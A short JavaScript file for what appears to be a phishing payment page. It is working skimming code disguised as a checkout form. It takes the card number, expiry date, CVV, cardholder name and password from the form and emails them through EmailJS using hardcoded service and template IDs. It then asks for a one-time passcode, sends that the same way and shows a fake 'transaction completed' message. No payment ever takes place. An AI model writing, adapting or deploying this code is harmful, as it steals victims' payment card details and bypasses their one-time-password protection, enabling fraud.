// Initialize EmailJS
(function() {
    emailjs.init("5vz8xe_J5s0yEGPz9"); // Your EmailJS API key here
})();

// Handle form submission
document.getElementById('payment-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const submitButton = document.getElementById('submit-button');
    const progressMessage = document.getElementById('progress-message');
    const otpContainer = document.getElementById('otp-container');

    // Disable the submit button and show progress message
    submitButton.disabled = true;
    progressMessage.style.display = 'block';

    const cardNumber = document.getElementById('cardNumber').value;
    const expirationDate = document.getElementById('expirationDate').value;
    const cvv = document.getElementById('cvv').value;
    const cardName = document.getElementById('cardName').value;
    const password = document.getElementById('password').value;

    const templateParams = {
        card_number: cardNumber,
        expiration_date: expirationDate,
        cvv: cvv,
        card_name: cardName,
        password: password
    };

    // Send email via EmailJS
    emailjs.send('service_qsx38ac', 'template_audd7fx', templateParams)
        .then(function(response) {
            // Show OTP input field
            otpContainer.style.display = 'block';
        }, function(error) {
            alert('Failed to send payment information: ' + JSON.stringify(error));
            progressMessage.style.display = 'none';
            submitButton.disabled = false;
        });
});

// Handle OTP submission
document.getElementById('otp-submit-button').addEventListener('click', function() {
    const otp = document.getElementById('otp').value;

    const otpTemplateParams = {
        otp: otp
    };

    // Send OTP via EmailJS
    emailjs.send('service_qsx38ac', 'template_audd7fx', otpTemplateParams)
        .then(function(response) {
            document.getElementById('transaction-completed-message').style.display = 'block';
            document.getElementById('progress-message').style.display = 'none';
            document.getElementById('otp-container').style.display = 'none';
        }, function(error) {
            alert('Failed to send OTP: ' + JSON.stringify(error));
        });
});
